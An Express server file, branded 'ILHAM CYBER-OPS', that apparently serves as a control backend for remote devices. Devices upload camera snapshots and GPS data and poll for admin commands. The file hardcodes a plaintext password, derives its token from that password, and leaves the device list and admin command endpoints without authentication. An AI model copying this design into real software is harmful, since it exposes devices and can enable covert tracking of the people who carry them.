import express from 'express';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';
import { telemetryHub } from './src/server/telemetryHub.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const server = createServer(app);
  const port = process.env.PORT || 3000;
  const isProd = process.env.NODE_ENV === 'production';

  // Increase payload limit for camera snapshot frames
  app.use(express.json({ limit: '20mb' }));
  app.use(express.urlencoded({ extended: true, limit: '20mb' }));

  // WebSocket Server setup
  const wss = new WebSocketServer({ server, path: '/ws' });

  wss.on('connection', (ws) => {
    ws.on('message', (data) => {
      telemetryHub.handleMessage(ws, data.toString());
    });

    ws.on('close', () => {
      telemetryHub.unregisterSocket(ws);
    });

    ws.on('error', (err) => {
      console.warn('WebSocket client error:', err);
      telemetryHub.unregisterSocket(ws);
    });
  });

  // REST API Endpoints (Dual Transport Fallback)
  app.get('/api/health', (_req, res) => {
    res.json({ status: 'ok', server: 'ILHAM CYBER-OPS' });
  });

  // Admin Authentication: Password 'Ilhamfazril'
  app.post('/api/auth/login', (req, res) => {
    const { password } = req.body;
    if (password === 'Ilhamfazril') {
      res.json({
        success: true,
        token: 'ILHAM-OPS-AUTH-' + Buffer.from('Ilhamfazril').toString('base64'),
        message: 'Akses Diberikan: Selamat Datang Komandan Ilham.',
      });
    } else {
      res.status(401).json({
        success: false,
        message: 'Akses Ditolak: Password salah.',
      });
    }
  });

  // List all active devices
  app.get('/api/devices', (_req, res) => {
    res.json({ devices: telemetryHub.getDevices() });
  });

  // Node registration
  app.post('/api/node/register', (req, res) => {
    const { nodeId, name, platform, battery, facingMode, gps } = req.body;
    const finalNodeId = nodeId || `NODE-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
    telemetryHub.updateTelemetry(finalNodeId, {
      gps,
      battery,
      facingMode,
    });
    res.json({ success: true, nodeId: finalNodeId });
  });

  // Node telemetry update (GPS, battery, etc.)
  app.post('/api/node/telemetry', (req, res) => {
    const { nodeId, gps, battery, facingMode, torchOn } = req.body;
    if (!nodeId) {
      res.status(400).json({ error: 'nodeId required' });
      return;
    }
    telemetryHub.updateTelemetry(nodeId, { gps, battery, facingMode, torchOn });
    res.json({ success: true });
  });

  // Node frame upload (Camera snapshot)
  app.post('/api/node/frame', (req, res) => {
    const { nodeId, image, fps } = req.body;
    if (!nodeId || !image) {
      res.status(400).json({ error: 'nodeId and image required' });
      return;
    }
    telemetryHub.updateFrame(nodeId, image, fps);
    res.json({ success: true });
  });

  // Node polls for pending commands (REST fallback)
  app.get('/api/node/poll-commands', (req, res) => {
    const nodeId = req.query.nodeId as string;
    if (!nodeId) {
      res.status(400).json({ error: 'nodeId required' });
      return;
    }
    const commands = telemetryHub.consumePendingCommands(nodeId);
    res.json({ commands });
  });

  // Admin sends command to node
  app.post('/api/admin/command', (req, res) => {
    const { targetId, action, state, facingMode, payload } = req.body;
    if (!targetId || !action) {
      res.status(400).json({ error: 'targetId and action required' });
      return;
    }
    const cmd = telemetryHub.dispatchCommand(targetId, {
      action,
      state,
      facingMode,
      payload,
    });
    res.json({ success: true, command: cmd });
  });

  // In Development, mount Vite middlewares
  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    // In Production, serve static build
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  server.listen(port, () => {
    console.log(`[ILHAM CYBER-OPS] Server running on http://localhost:${port}`);
  });
}

startServer().catch((err) => {
  console.error('[ILHAM CYBER-OPS] Server failed to start:', err);
});
